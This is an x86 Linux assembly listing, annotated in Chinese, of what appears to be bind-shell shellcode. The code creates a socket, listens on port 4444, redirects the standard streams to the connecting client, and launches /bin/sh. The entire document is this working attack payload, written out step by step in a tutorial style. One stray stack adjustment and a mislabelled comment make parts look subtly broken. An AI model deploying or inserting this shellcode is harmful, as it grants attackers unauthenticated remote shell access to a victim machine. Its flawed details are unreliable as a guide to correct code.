global _start  
		section .text  
_start:  
		xor eax, eax  	;（4-12）：调用 socket()创建套接字
		mov ebx, eax  
 		mov ecx, eax  
		mov edx, eax  	;			protocol = 0
		mov ax, 0x167 	;			系统调用号：359
		add esp, eax  
		mov bl, 0x2  	;			domain = AF_INET
		mov cl, 0x1   	;			type = SOCK_STREAM
 		int 0x80 
		mov ebx, eax 	;	ebx = ss（创建的服务器套接字）
   
 		xor eax, eax  	;（15-23）：调用bind()将套接字fd和地址结构addr绑定
 		mov ax, 0x169 	;			 系统调用号：361 
		xor ecx, ecx  	;（17-21）：构造sockaddr_in结构体
 		push ecx       	;			sin_addr = INADDR_ANY（本地） 
		push word 0x5c11;			sin_port = 4444 
		push word 0x2   ;				sin_zero = AF_INET as sin_family  
		mov ecx, esp 	;	ecx = struct sockaddr_in addr 
		mov dl, 0x10 	;			edx = sizeof(addr) = 16 bytes  
		int 0x80 
  
 		xor ecx, ecx  	;（25-28）：调用listen()函数设置监听队列
		xor eax, eax  
		mov ax, 0x16b 	;			系统调用号：363
		int 0x80 
 
		xor eax, eax  	;（30-37）：调用accept4()函数接收客户端连接
		mov ax, 0x16c 	;			系统调用号364 
		push ecx 		;			NULL压栈
		mov esi, ecx  	;			flags = 0 
		mov ecx, esp 	;			addr = NULL
		mov edx, esp  	;			addrlen = NULL
  	    int 0x80 
 		mov ebx, eax	;		ebx =  cs（accept4获取的客户端套接字）
   
 		xor ecx, ecx  	;（39-46）：通过ecx=2、1、0循环，将STDERR、STDOUT、STDIN
 		mov cl,  2  	;				通过dup2函数重定向到客户端套接字cs 
 		xor eax, eax   
dup2:  
		mov al, 0x3F	;				系统调用号：63  
  		int 0x80  
 		dec ecx  
		jns dup2    
  
 		xor eax, eax  	;	（48-56）：调用execve执行shell
		push eax   		;			NULL压栈
		push 0x68732f2f ;	 			"//sh"
		push 0x6e69622f ;	 			"/bin"  
		mov ebx, esp 	; 			filename = “/bin//sh”的首地址
		xor ecx, ecx  
  		xor edx, edx  	;			envp = NULL
 		mov al, 0xB 	;				系统调用号：11
 		int 0x80  
